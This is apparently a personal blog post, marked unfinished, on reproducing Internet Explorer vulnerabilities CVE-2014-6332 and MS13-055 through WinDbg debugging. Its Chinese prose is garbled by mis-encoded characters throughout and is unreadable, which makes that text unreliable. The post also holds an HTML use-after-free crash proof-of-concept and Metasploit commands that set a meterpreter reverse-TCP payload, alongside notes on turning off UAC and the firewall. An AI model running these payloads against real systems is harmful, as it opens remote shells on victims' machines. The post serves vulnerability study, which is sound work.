---
date: 2023-06-01 16:04:26
title: CVE-2014-6332å¤ç°
layout: post
tags: null
categories:
  - æœªå†™å®Œ
---

## ç¯å¢ƒ






## äº§ç”ŸåŸå› 



å¤„ç† OLE(Object Linking and Embeddingï¼Œå¯¹è±¡é“¾æ¥ä¸åµŒå…¥) å¤±è´¥ [å‚è€ƒ](https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=70116) ã€‚

æœªå¯¹ä¼ å…¥å‚æ•°`psaboundNew`è¿›è¡Œæœ‰æ•ˆæ ¡éªŒï¼Œä»¥è‡´å¯ä»¥è¶Šç•Œè¯»å†™ï¼Œè¿›è€Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œã€‚[å‚è€ƒ](https://www.anquanke.com/post/id/233824)







## windbgä½¿ç”¨å‘½ä»¤

å‚è€ƒ [è¿™ç¯‡æ–‡ç« ](https://github.com/ricew4ng/BrowserSecurity/blob/master/IE8%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9ECVE-2012-1876/IE8%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9ECVE-2012-1876.md)ï¼Œå½“å¼¹å‡ºç»„ç»‡æ¡†çš„æ—¶å€™ï¼Œå†ç”¨windbgé™„åŠ è¿›ç¨‹ã€‚

![image-20230602102817727](/CVE-2014-6332/1.png)



```bash
3. è¿œç¨‹è°ƒè¯•
windbg.exe -server tcp:port=8888 -p 1324
ä½¿ç”¨æ•™ç¨‹å‚è€ƒï¼šhttps://blog.csdn.net/yjz1409276/article/details/72827257

tcp:port=8888,server=192.168.42.131

4.ä¸‹è½½ç¬¦å·æ–‡ä»¶
.sympath SRV*C:\symbols*https://msdl.microsoft.com/download/symbols
!sym noisy

.symfix
.symfix+ C:\ProgramData\dbg\sym #è®¾ç½®æœ¬åœ°ç¬¦å·æ–‡ä»¶è·¯å¾„ 
.sympath
.reload

#é‡æ–°å¼ºåˆ¶åŠ è½½æŸpdb
.reload /f wow64.dll


è®¾ç½®æ–­ç‚¹

bp address
bu MyDLL!MyFunction

#åŠ è½½dllæ—¶ è®¾ç½®æ–­ç‚¹
sxe ld:oleaut32.dll 

```



```bash
r rax # æ˜¾ç¤ºå¯„å­˜å™¨çš„å€¼
d(bwq) address #æ˜¾ç¤ºå†…å­˜çš„å€¼
u #åæ±‡ç¼–


```



```bash
# è°ƒè¯•å‘½ä»¤

sxe ld vbscript.dll # æ¨¡å—è¢«åŠ è½½æ—¶è§¦å‘äº‹ä»¶ æš‚åœ

*gï¼ˆGoï¼‰ï¼šè¿™ä¸ªå‘½ä»¤ä¼šè®©ç¨‹åºç»§ç»­æ‰§è¡Œï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹ã€å¼‚å¸¸æˆ–è€…ç”¨æˆ·æ‰‹åŠ¨æš‚åœã€‚
*pï¼ˆStep overï¼‰ï¼šè¿™ä¸ªå‘½ä»¤ç”¨äºå•æ­¥æ‰§è¡Œï¼Œä½†å¦‚æœå½“å‰çš„æŒ‡ä»¤æ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼Œå®ƒä¸ä¼šè¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯æ‰§è¡Œå®Œæ•´ä¸ªå‡½æ•°ååœä¸‹ã€‚
*tï¼ˆStep intoï¼‰ï¼šè¿™ä¸ªå‘½ä»¤ä¹Ÿæ˜¯ç”¨äºå•æ­¥æ‰§è¡Œï¼Œå¦‚æœå½“å‰æŒ‡ä»¤æ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼Œå®ƒä¼šè¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œå¹¶åœ¨å‡½æ•°çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ä¸Šåœä¸‹ã€‚
*guï¼ˆStep outï¼‰ï¼šè¿™ä¸ªå‘½ä»¤ä¼šè®©ç¨‹åºç»§ç»­æ‰§è¡Œï¼Œç›´åˆ°å½“å‰å‡½æ•°è¿”å›ã€‚

```



æ˜¾ç¤ºå‡½æ•°çš„å‚æ•°

```bash
I tried the following command
0:000> x /t /d mshtml!CEventObj::GenericGetElement
7d6d51b9 <NoType> mshtml!CEventObj::GenericGetElement = <no type information>
```











## MS13-055



å‚è€ƒæ–‡ç« ï¼š[UAFæ¼æ´](https://connormcgarr.github.io/browser1/)

1. C++åŸºç¡€çŸ¥è¯†

```bash
g++ -Wall -g -o tmp tmp.cpp
```

åˆ›å»ºç±»çš„æ—¶å€™ ä¼šè°ƒç”¨constructorã€‚

åœ¨è°ƒç”¨è™šå‡½æ•°æ—¶ï¼Œä½¿ç”¨vftableå»æ‰¾è¦è°ƒç”¨çš„å‡½æ•°ã€‚



2. è°ƒè¯•

```bash
.symfix
.reload
bp windbg!main

0:000> u rip L4
windbg!main+0xdd [F:\windbg\windbg\test.cpp @ 96]:
00007ff6`460e2a8d 488b4508        mov     rax,qword ptr [rbp+8]
00007ff6`460e2a91 488b00          mov     rax,qword ptr [rax]
00007ff6`460e2a94 488b4d08        mov     rcx,qword ptr [rbp+8]
00007ff6`460e2a98 ff5008          call    qword ptr [rax+8]

bp 00007ff6`460e2a91
bp 00007ff6`460e2a94
bp 00007ff6`460e2a98
```



3. ä»¥postmortemè¿è¡Œ

```bash
D:\Windows Kits\10\Debuggers\x64
.\windbg.exe -I
.\gflags.exe /p /enable F:\windbg\x64\Debug\windbg.exe #æ‰“å¼€PageHeapï¼Œå¦‚æœåœ¨åˆ©ç”¨å †æ¼æ´ï¼Œä¼šå¯¼è‡´ç¨‹åºè¿è¡Œå¤±è´¥ã€‚æ‰“å¼€PageHeapåï¼Œå¯ä»¥ç»™æ›´å¤šçš„æç¤ºä¿¡æ¯ã€‚
```



4. Windowså †åŸºç¡€çŸ¥è¯†

```bash
0:000> !heap
        Heap Address      NT/Segment Heap

         1ddc8dc0000              NT Heap
         1ddc9ef0000              NT Heap
         1ddc64e0000              NT Heap

dt ntdll!_HEAP 1ddc64e0000
	...
   +0x138 BlocksIndex      : 0x000001dd`c64e02e8 Void
	...
	# å…¶ä¸­ BlocksIndex å°±æ˜¯ _HEAP_LIST_LOOKUP ç»“æ„ã€‚


dt ntdll!_HEAP_LIST_LOOKUP 0x000001dd`c64e02e8
0:000> dt ntdll!_HEAP_LIST_LOOKUP 0x000001dd`c64e02e8
   +0x000 ExtendedLookup   : (null) 
   +0x008 ArraySize        : 0x80
   +0x00c ExtraItem        : 0
   +0x010 ItemCount        : 1
   +0x014 OutOfRangeItems  : 1
   +0x018 BaseIndex        : 0
   +0x020 ListHead         : 0x000001dd`c64e0150 _LIST_ENTRY [ 0x000001dd`c64e0750 - 0x000001dd`c64e0750 ]
   +0x028 ListsInUseUlong  : 0x000001dd`c64e0320  -> 0
   +0x030 ListHints        : 0x000001dd`c64e0330  -> (null) 
#å¯¹å…¶è§£é‡Šå¦‚ä¸‹ï¼š
#ntdll!_HEAP_LIST_LOOKUPæ˜¯ä¸€ä¸ªWindowså†…æ ¸æ•°æ®ç»“æ„ï¼Œå®ƒç”¨äºä¼˜åŒ–å †å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾ã€‚è¿™ä¸ªç»“æ„åŒ…å«ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œè¿™äº›é“¾è¡¨ç”¨äºè¿½è¸ªç‰¹å®šå¤§å°çš„å¯ç”¨å†…å­˜å—ã€‚
#æ¯ä¸ªå­—æ®µè§£é‡Šå¦‚ä¸‹
```

* ExtendedLookup: è¿™ä¸ªå­—æ®µæ˜¯ä¸€ä¸ªæŒ‡å‘_HEAP_LIST_LOOKUPç»“æ„çš„æŒ‡é’ˆï¼Œç”¨äºå¤„ç†å¤§äºArraySizeçš„å†…å­˜è¯·æ±‚ã€‚

* ArraySize: è¿™ä¸ªå­—æ®µè¡¨ç¤ºListHeadæ•°ç»„çš„å¤§å°ã€‚ArraySizeçš„å€¼è¡¨ç¤ºæœ‰å¤šå°‘ä¸ªä¸åŒå¤§å°çš„å†…å­˜å—å¯ä»¥è¢«è¿½è¸ªã€‚
* ExtraItem: è¿™ä¸ªå­—æ®µè¡¨ç¤ºæ˜¯å¦æœ‰ä¸€ä¸ªé¢å¤–çš„å…ƒç´ åœ¨ListHeadæ•°ç»„çš„æœ«å°¾ã€‚
* ItemCount: è¿™ä¸ªå­—æ®µè¡¨ç¤ºListHeadæ•°ç»„ä¸­å½“å‰å·²ç»è¢«ä½¿ç”¨çš„å…ƒç´ æ•°é‡ã€‚
* OutOfRangeItems: è¿™ä¸ªå­—æ®µè¡¨ç¤ºè¯·æ±‚å†…å­˜å¤§å°è¶…å‡ºArraySizeèŒƒå›´çš„æ¬¡æ•°ã€‚ 
* BaseIndex: è¿™ä¸ªå­—æ®µè¡¨ç¤ºç”¨äºè®¡ç®—å†…å­˜å—å¤§å°çš„åŸºç¡€ç´¢å¼•ã€‚
* ListHead: è¿™ä¸ªå­—æ®µæ˜¯ä¸€ä¸ªæŒ‡å‘_LIST_ENTRYç»“æ„çš„æŒ‡é’ˆï¼Œ_LIST_ENTRYç»“æ„è¡¨ç¤ºä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œè¿™ä¸ªé“¾è¡¨ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½è¡¨ç¤ºä¸€ä¸ªç‰¹å®šå¤§å°çš„å¯ç”¨å†…å­˜å—ã€‚
* ListsInUseUlong: è¿™ä¸ªå­—æ®µæ˜¯ä¸€ä¸ªæŒ‡å‘ä¸€ä¸ªæ•´æ•°æ•°ç»„çš„æŒ‡é’ˆï¼Œè¿™ä¸ªæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½è¡¨ç¤ºListHeadæ•°ç»„ä¸­å¯¹åº”ä½ç½®çš„å…ƒç´ æ˜¯å¦æ­£åœ¨ä½¿ç”¨ã€‚
* ListHints: è¿™ä¸ªå­—æ®µæ˜¯ä¸€ä¸ªæŒ‡å‘_LIST_ENTRYæ•°ç»„çš„æŒ‡é’ˆï¼Œè¿™ä¸ªæ•°ç»„ç”¨äºå¿«é€Ÿæ‰¾åˆ°freeæ‰çš„å†…å­˜å—ã€‚



5. LFH(ä½ç¢ç‰‡å †)

å½“è¿ç»­è¯·æ±‚18ä¸ªç›¸åŒå¤§å°çš„å †å—æ—¶ï¼Œå°±ä¼šè§¦å‘LFHã€‚å¦åˆ™ä½¿ç”¨çš„æ˜¯back-endè¿›è¡Œå¤„ç†ã€‚

Windows7ä¸­ï¼Œé‡‡ç”¨åè¿›å…ˆå‡ºçš„æ–¹å¼ã€‚

LFHå°±æ˜¯Windows7åŠä¹‹åç³»ç»Ÿçš„å‰ç«¯ç®¡ç†ã€‚Windows10è¿˜å¢åŠ äº†segment heapã€‚



6. expåˆæ¢

å®Œæ•´expåœ°å€ï¼šhttps://www.exploit-db.com/exploits/28187



crashçš„htmlä»£ç å¦‚ä¸‹

```bash
<!DOCTYPE html>
    <script>
        window.onload = function() {
            var x = document.getElementById("a");
            x.outerText = "";
        }
    </script>
        <table>
            <tr>
                <div>
                    <span>
                        <q id='a'>
                            <a>
                                <td></td>
                            </a>
                        </q>
                    </span>
                </div>
            </tr>
        </table>
<html>
```



æ¼æ´äº§ç”ŸåŸå› ï¼šåœ¨CTableRowå…ƒç´ åå‡ºç° CPhraseElement xï¼Œæœ€åå…ƒç´ æ˜¯å­è¡¨å…ƒç´ ã€‚

CPhraseElementçš„outerTextå±æ€§è¢«freeæ‰äº†ï¼Œä½†æ˜¯è¿˜å­˜åœ¨äºC++çš„ä¸€äº›é“¾è¡¨ä¸­ã€‚è®¿é—®å·²ç»freeæ‰çš„å…ƒç´ ï¼Œå°±ä¼šé€ æˆcrashã€‚



Dockerå¯åŠ¨ä»£ç 

```bash
docker stop xxxx
docker build -t my-nginx .
docker run -d -p 10001:80 my-nginx
```



Windowsä¸­è®¾ç½®postmortemæ¨¡å¼

```bash
.\windbg.exe -I
```

IE8è®¿é—®ï¼Œå‘ç”Ÿcrashï¼Œå›é¡¾çŸ¥è¯†ç‚¹ï¼Œè¿™æ˜¯ç”±äºUAFå’Œè™šå‡½æ•°çš„ä½¿ç”¨ã€‚



æ‰“å¼€PageHeapï¼Œï¼ˆæœ€ç»ˆï¼‰çœ‹ä¸€çœ‹å·²ç»é‡Šæ”¾çš„å†…å­˜

```bash
gflags.exe /p /enable iexplore.exe
```



7. pocè§¦å‘

```bash
#windbgä¸­
lm m mshtml #ç¡®è®¤å·²ç»åŠ è½½
x mshtml!CElement* #æ˜¾ç¤ºæ‰€æœ‰ä»¥ CElement å¼€å¤´çš„ç¬¦å·åŠå…¶åœ°å€
x mshtml!CElement::Doc
  #å¾—åˆ° 00000000`7382b68d MSHTML!CElement::Doc = <no type information>

bp 00000000`7382b68d
g
```

å‡ºç°å¦‚ä¸‹æŠ¥é”™

```bash
Breakpoint 0's offset expression evaluation failed.
check for invalid symbols or bas syntax.
WaitForEvent failed
```

åˆ é™¤æ–­ç‚¹0

```bash
bc 0
g
```



åˆå‡ºç°å¦‚ä¸‹æŠ¥é”™

```bash
(a74.9ec): Unknow exception -code 00000000(first chance)
(a74.9ec): Unknow exception -code 00000000(!!! second chance!!!)
ntdll_77b70000!NtRaiseException+0x12
```



çŒœæµ‹è¿˜æ˜¯ç¬¦å·è·¯å¾„åŠ è½½ä¸å¯¹ï¼Œé‡æ–°åŠ è½½

```bash
.symfix
.symfix+ c:\symbols
.sympath
.reload
```

å‡ºç°å¦‚ä¸‹æŠ¥é”™

```bash
(40c.57c): Access violation -code c0000005(!!! second chance!!!)
ntdll_77b70000!NtRaiseException+0x12
```

!heap å‡ºç°å¦‚ä¸‹ä¿¡æ¯

```bash
your debugger is not using the correct symbols
```



8. å…³é—­ASLR

kbæŸ¥çœ‹è°ƒç”¨æ ˆï¼Œå‘ç°æœ‰MSHML:CElementã€‚

æ–‡ç« ä¸­ç»™å‡ºçš„æ˜¯åœåœ¨äº† MSHTML!CElementï¼Œ

è®¾ç½®æ–­ç‚¹ï¼š 

```bash
x MSHTML!CElement::EnsureRecalcNotiry
	# 74e656de
bu 74e656de

# æŸ¥çœ‹æ±‡ç¼–ä»£ç 
u 74e656de L10
```



9. æŸ¥çœ‹è°ƒç”¨æ ˆ

```bash
kv (or kb)
```

å‘ç°æœ‰MSHTML!CElement çš„ä¸¤ä¸ªå‡½æ•°ã€‚

![image-20230607111402057](/CVE-2014-6332/2.png)

ä½†æ˜¯æš‚åœçš„åœ°æ–¹å’Œå‚è€ƒæ–‡ç« ä½ç½®ä¸ä¸€æ ·ï¼Œæˆ‘çŒœæµ‹æ˜¯å› ä¸ºç³»ç»Ÿç‰ˆæœ¬ä¸åŒå¯¼è‡´çš„ã€‚å‚è€ƒæ–‡ç« ä½¿ç”¨x86ï¼Œæˆ‘ä½¿ç”¨x64ã€‚



ä½¿ç”¨å…¶ä»–å‘½ä»¤å¦‚ analyzeæ¥åˆ†æ

```bash
!analyze -v
```

<img src="/CVE-2014-6332/3.png" alt="image-20230607154724303" style="zoom:80%;" />

æŸ¥çœ‹åæ±‡ç¼–ä»£ç ï¼Œå¦‚ä¸‹ã€‚

<img src="/CVE-2014-6332/4.png" alt="image-20230607155110846" style="zoom:80%;" />

è¿™å‡ è¡Œåæ±‡ç¼–çš„ä½œç”¨æ˜¯è°ƒç”¨è™šå‡½æ•°è¡¨ï¼Œéœ€è¦å€Ÿç”¨è™šå‡½æ•°æŒ‡é’ˆ(vptr)ã€‚

* é¦–å…ˆecxä½œä¸ºvptrï¼Œè¿›è¡ŒåºŸå¼ƒï¼Œå­˜å‚¨åˆ°eaxä¸­ï¼Œè¿™æ—¶eaxä¹Ÿæ˜¯ä¸€ä¸ªvptrã€‚

* å…¶æ¬¡eaxå–å…¶æŒ‡å‘çš„è™šå‡½æ•°è¡¨çš„ 0x70å¤„çš„å€¼ï¼Œèµ‹å€¼ç»™edxã€‚æ­¤æ—¶edxè¡¨ç¤ºä¸€ä¸ªè™šå‡½æ•°ã€‚

* è°ƒç”¨edxï¼Œå³è°ƒç”¨è¯¥è™šå‡½æ•°ã€‚

<img src="CVE-2014-6332/5.png" alt="image-20230607162824005" style="zoom:50%;" />





10. æŸ¥çœ‹å †ç»“æ„



```bash
r #æŸ¥çœ‹å¯„å­˜å™¨çš„å€¼
!heap -p #æ˜¾ç¤ºå¯ç”¨å †
!heap -p -a ecx #å¯„å­˜å™¨
!heap -i [address] #åœ°å€
```



11. æ‰¾åˆ°freeå‘ç”Ÿçš„åœ°æ–¹

æœ€ç»ˆfreeçš„æ‰§è¡Œæƒæ˜¯äº¤ç»™Windows APIçš„ã€‚

IDAåˆ†æmshtml.dllï¼ˆä½äº C:\Windows\system32ï¼‰ï¼ˆä¸ºäº†æ–¹ä¾¿ï¼Œæ²¡æœ‰ä½¿ç”¨Windows7è™šæ‹Ÿæœºä¸­çš„ï¼Œè€Œæ˜¯ä½¿ç”¨Windows10å®¿ä¸»æœºä¸­çš„ï¼‰ã€‚

ä¸‹è½½PDB: https://github.com/rajkumar-rangaraj/PDB-Downloader

IDAåŠ è½½ï¼Œæ‰¾åˆ° CTreeNode::ComputeFormatsHelper

![image-20230607174406211](/CVE-2014-6332/6.png)

è¿›å…¥Cleanupå‡½æ•°ï¼Œå…¶ä¸­ç›´æ¥å°±æœ‰HeapFreeå‡½æ•°ã€‚

<img src="CVE-2014-6332/7.png" alt="image-20230607185129300" style="zoom:67%;" />

Cleanupä¸­ä¹Ÿæœ‰  CCustomCursor::`scalar deleting destructor'(v5, a2); è¿™ä¸ªå°ç‰‡æ®µå’Œå‚è€ƒæ–‡ç« ä¸­çš„æ˜¯ä¸€æ ·çš„ã€‚

<img src="CVE-2014-6332/8.png" alt="image-20230607190206321" style="zoom:80%;" />



12. å…³é—­PageHeap

```bash
gflags.exe /p /enable iexplore.exe
```



### å¾…çœ‹

ä¸»å‚è€ƒæ–‡ç« ï¼šhttps://connormcgarr.github.io/browser1/

exp: https://www.exploit-db.com/exploits/28187









.sympath SRV*cache*https://msdl.microsoft.com/download/symbols







## CVE-2014-6332















### msfconsoleå¤ç°

å‚è€ƒï¼šhttps://www.cnblogs.com/tsimfeiwan/p/11993640.html

```bash
msfconsole
search MS14_064
use exploit/windows/browser/ms14_064_ole_code_execution
show payloads
```



```bash
msf6 exploit(windows/browser/ms14_064_ole_code_execution) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```



è®¾ç½®

```bash
set AllowPowershellPrompt true
set SRVHOST 172.16.1.110
set LHOST 172.16.1.110
exploit
```



ğŸŒŸ **é—®é¢˜1:** åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°Windows7å‡ºç°ï¼š

<img src="/CVE-2014-6332/9.png" alt="image-20230601164710842" style="zoom:67%;" />

**è§£å†³æ–¹æ¡ˆ1ï¼š**å¼€å§‹--->æ§åˆ¶é¢æ¿--->ç”¨æˆ·è´¦æˆ·--->æ›´æ”¹ç”¨æˆ·å¸æˆ·æ§åˆ¶è®¾ç½®--->ä»ä¸é€šçŸ¥ã€‚





ğŸŒŸ **é—®é¢˜2:** ä¸Šè¿°æŠ¥é”™æ²¡æœ‰äº†ï¼Œä½†æ˜¯æ²¡æœ‰æ”»å‡»æˆåŠŸï¼Œæ²¡æœ‰å¼¹å‡ºçª—å£ã€‚

**è§£å†³æ–¹æ¡ˆ1:** å…³é—­é˜²ç«å¢™ã€‚åˆæŠ¥é”™



### å¾…çœ‹

safariåŠ äº†å¾ˆå¤šé“¾æ¥



## å…¶å®ƒæ¼æ´



* CVE-2013-1347

https://securityintelligence.com/cve-2013-1347-microsoft-internet-explorer-cgenericelement-object-use-after-free-vulnerability/





* æ‚æ•™ç¨‹

https://fuzzysecurity.com/tutorials.html

https://mp.weixin.qq.com/s/GWjCUidztHhOg4yCmEwlHg